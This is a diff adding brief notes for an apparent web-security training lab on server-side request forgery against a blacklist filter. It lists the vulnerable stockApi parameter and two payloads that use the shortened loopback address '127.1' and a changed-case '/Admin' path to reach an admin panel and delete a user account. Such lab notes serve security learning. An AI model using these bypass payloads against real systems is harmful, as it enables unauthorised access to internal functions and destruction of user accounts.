@@ -1,0 +1,17 @@
+Lab: SSRF with blacklist-based input filter
+
+info :
+    - connect to http://localhost/admin
+    - stock check feature is vulnerable
+
+end goal :
+    - Delete Carlos account
+
+analysis:
+
+- Vulnerable feature: stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1
+
+- Access admin account payload: stockApi=http://127.1/Admin
+
+- Delete Carlos account payload: stockApi=http://127.1/Admin/delete?username=Carlos
+
